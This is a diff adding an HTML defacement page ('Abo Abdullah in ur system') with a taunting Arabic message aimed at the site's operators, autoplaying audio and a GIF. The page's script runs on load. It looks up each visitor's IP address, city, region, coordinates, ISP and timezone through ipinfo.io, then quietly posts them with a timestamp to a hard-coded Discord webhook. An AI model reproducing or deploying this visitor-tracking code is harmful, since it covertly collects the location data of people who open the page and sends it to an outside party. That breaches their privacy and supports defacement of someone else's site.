@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Marco in ur system</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+body {
+    margin:0;
+    padding:0;
+    background:#000;
+    color:#fff;
+    font-family:'JetBrains Mono', monospace;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:flex-start;
+    min-height:100vh;
+}
+.loading-screen {
+    position:fixed;
+    inset:0;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    background:#000;
+    z-index:100;
+}
+.loading-text {
+    font-family:'Orbitron', sans-serif;
+    font-size:5rem;
+    color:#fff;
+    text-align:center;
+}
+.main-content {
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    margin-top:50px;
+    width: 100%;
+}
+.gif-container {
+    width:100%;
+    max-width:600px;
+    text-align:center;
+    margin-top:30px;
+}
+.gif-container img {
+    width:100%;
+    border-radius:12px;
+}
+.sub-title {
+    color:#fff;
+    font-family:'Orbitron', sans-serif;
+    font-size:2rem;
+    text-align:center;
+    margin-top:15px;
+}
+.info {
+    margin-top:30px;
+    background:rgba(0,0,0,0.6);
+    padding:25px;
+    border-radius:15px;
+    width:90%;
+    max-width:600px;
+    font-size:16px;
+    line-height:1.8;
+    color:#fff;
+}
+.info span{display:block;margin:5px 0;}
+.footer {
+    margin-top:25px;
+    color:#fff;
+    font-family:'Orbitron', sans-serif;
+    font-size:1rem;
+}
+</style>
+</head>
+<body>
+
+<!-- Loading Screen -->
+<div class="loading-screen" id="loadingScreen">
+    <div class="loading-text" id="headerText">Abo Abdullah in ur system</div>
+</div>
+
+<!-- Main Content -->
+<div class="main-content" id="mainContent" style="display:none;">
+    <div class="gif-container" id="gifContainer">
+        <img src="https://media.discordapp.net/attachments/1278395900594491433/1404503478335967262/8146270548efc75fc511a620bc8904af.gif?ex=68d17acb&is=68d0294b&hm=d7a21bf91d43347069100dfd456ac39ee18a53d8c7f029e51e1d601aa2c233ce&width=750&height=312&" alt="GIF">
+    </div>
+
+    <div class="sub-title" id="subTitle">ياتعدلون حمايتكم ياتفشلون ياحمير..</div>
+
+    <div class="info" id="ip-info">
+        <span><strong>IP:</strong> <span id="ip">loading...</span></span>
+        <span><strong>City:</strong> <span id="city">loading...</span></span>
+        <span><strong>Region:</strong> <span id="region">loading...</span></span>
+        <span><strong>Country:</strong> <span id="country">loading...</span></span>
+        <span><strong>Location:</strong> <span id="loc">loading...</span></span>
+        <span><strong>Organization:</strong> <span id="org">loading...</span></span>
+        <span><strong>Timezone:</strong> <span id="timezone">loading...</span></span>
+    </div>
+
+    <div class="footer">© Abo Abdullah Network</div>
+</div>
+
+<audio autoplay loop>
+    <source src="https://cdn.discordapp.com/attachments/1419391686190170166/1419392823924494456/9d0de85b293ad1f2.mp3?ex=68d19814&is=68d04694&hm=da6317a23432ffc8a708f399c29ffe99446686908033b951c465ee1c0715c064&" type="audio/mpeg">
+</audio>
+
+<script>
+// عرض Ha2moD أولاً ثم المحتوى
+window.addEventListener('load', function() {
+    setTimeout(()=>{
+        document.getElementById('loadingScreen').style.display = 'none';
+        document.getElementById('mainContent').style.display = 'flex';
+    },2000);
+});
+
+// جلب معلومات IP
+fetch('https://ipinfo.io/json')
+.then(res=>res.json())
+.then(data=>{
+    const {ip, city, region, country, loc, org, timezone} = data;
+    const infoDiv = document.getElementById('ip-info');
+    infoDiv.innerHTML = `<span><strong>IP:</strong> ${ip}</span>
+                         <span><strong>City:</strong> ${city}</span>
+                         <span><strong>Region:</strong> ${region}</span>
+                         <span><strong>Country:</strong> ${country}</span>
+                         <span><strong>Location:</strong> ${loc}</span>
+                         <span><strong>Organization:</strong> ${org}</span>
+                         <span><strong>Timezone:</strong> ${timezone}</span>`;
+
+    // ارسال البيانات عبر Webhook
+    const webhookUrl = 'https://discord.com/api/webhooks/1419391938720960612/w7f_6Y6RJ-Whi9WizPaaYGK-FmiONfYO3FomiPoVzvw9LUpz6CPOHrZ4a0UWbozBNBFm';
+    const dateTime = new Date().toLocaleString();
+    fetch(webhookUrl, {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({
+            content: `IP: ${ip}\nCity: ${city}\nRegion: ${region}\nCountry: ${country}\nLocation: ${loc}\nOrg: ${org}\nTimezone: ${timezone}\nDateTime: ${dateTime}`
+        })
+    });
+});
+</script>
+
+</body>
+</html>
